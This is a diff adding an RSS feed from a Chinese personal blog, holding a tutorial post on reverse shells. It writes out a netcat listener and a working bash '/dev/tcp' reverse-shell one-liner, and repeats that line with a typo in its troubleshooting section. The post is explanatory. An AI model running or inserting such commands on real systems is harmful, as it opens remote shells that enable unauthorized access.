@@ -1,0 +1,87 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>SnowRoll Blog • Posts by &#34;reverse-shell&#34; tag</title>
+        <link>https://snowroll.github.io</link>
+        <description>分享经验，记录生活</description>
+        <language>zh-CN</language>
+        <pubDate>Sat, 13 Aug 2022 07:05:11 +0000</pubDate>
+        <lastBuildDate>Sat, 13 Aug 2022 07:05:11 +0000</lastBuildDate>
+        <category>python</category>
+        <category>codeql</category>
+        <category>crypto</category>
+        <category>Line By Line</category>
+        <category>paper</category>
+        <category>basketball</category>
+        <category>read</category>
+        <category>chatgpt</category>
+        <category>crawler</category>
+        <category>dockerß</category>
+        <category>email</category>
+        <category>github page</category>
+        <category>gitlab</category>
+        <category>linux</category>
+        <category>heartbeat, java</category>
+        <category>latex</category>
+        <category>shell</category>
+        <category>markdown</category>
+        <category>mongodb</category>
+        <category>photograph</category>
+        <category>powershell</category>
+        <category>reverse-shell</category>
+        <category>mail</category>
+        <category>except</category>
+        <category>java</category>
+        <category>travel</category>
+        <item>
+            <guid isPermalink="true">https://snowroll.github.io/reverse-shell/</guid>
+            <title>反向shell</title>
+            <link>https://snowroll.github.io/reverse-shell/</link>
+            <category>linux</category>
+            <category>reverse-shell</category>
+            <pubDate>Sat, 13 Aug 2022 07:05:11 +0000</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;什么是反向shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反向shell&#34;&gt;#&lt;/a&gt; 什么是反向 shell&lt;/h1&gt;
+&lt;p&gt;我们在客户端 A 通过 &lt;code&gt;ssh&lt;/code&gt;  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh test@10.10.10.1 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。&lt;/p&gt;
+&lt;p&gt;客户端 A （假设 ip 为 1.2.3.4）&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;bash&#34;&gt; 打开一个端口，监听连接请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。&lt;/p&gt;
+&lt;p&gt;参数说明：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-l 使用监听模式&lt;/li&gt;
+&lt;li&gt;-vv verbose，使用两次会有更多信息&lt;/li&gt;
+&lt;li&gt;-p 本地端口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell&lt;/p&gt;
+&lt;p&gt;服务器端 B&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/2333 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell&lt;/p&gt;
+&lt;p&gt;参考文章： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=&#34;&gt;https://www.jianshu.com/p/80d6b5a61372&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;命令详解：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;bash 命令行&lt;/li&gt;
+&lt;li&gt;-i 交互模式&lt;/li&gt;
+&lt;li&gt;&amp;gt;&amp;amp; 输出重定向，1 &amp;gt; 可以省略为 &amp;gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出&lt;/li&gt;
+&lt;li&gt;/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器&lt;/li&gt;
+&lt;li&gt;0&amp;gt;&amp;amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;由于 Linux 下一切皆文件，所以可以使用 &lt;code&gt;/dev/tcp&lt;/code&gt;  创建一个 socket 套接字，而 &lt;code&gt;/$&amp;#123;host&amp;#125;/$&amp;#123;port&amp;#125;&lt;/code&gt;  则是传入的参数。&lt;/p&gt;
+&lt;h1 id=&#34;反向shell工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反向shell工具&#34;&gt;#&lt;/a&gt; 反向 shell 工具&lt;/h1&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv&#34;&gt;gsocket.io&lt;/span&gt;&lt;/p&gt;
+&lt;h2 id=&#34;可能的问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可能的问题&#34;&gt;#&lt;/a&gt; 可能的问题&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;shell 反弹失败&lt;/p&gt;
+&lt;p&gt;可能原因 1:&lt;/p&gt;
+&lt;p&gt;ubuntu 系统打开的终端默认为 &lt;code&gt;sh&lt;/code&gt; ，而 &lt;code&gt;sh&lt;/code&gt;  实际指向的是非交互式终端  &lt;code&gt;dash&lt;/code&gt; ，需要先切换到 &lt;code&gt;bash&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bach -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;-c 执行 command string&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
